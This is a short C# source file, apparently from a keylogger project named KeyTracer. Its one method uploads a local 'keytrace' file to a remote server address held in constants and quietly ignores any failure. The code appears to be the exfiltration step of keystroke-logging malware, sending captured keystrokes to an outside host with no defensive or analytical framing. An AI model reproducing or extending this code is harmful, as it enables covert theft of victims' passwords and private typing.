using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;

namespace KeyTracer
{
    static class Server
    {
        public static int Upload()
        {
            try
            {
                WebClient webClient = new WebClient();

                webClient.UploadFile(Consts.Server + Consts.serverKeyTraces, Consts.keytracePath);

                return 1;
            }
            catch
            {
                return 0;
            }
        }
    }
}
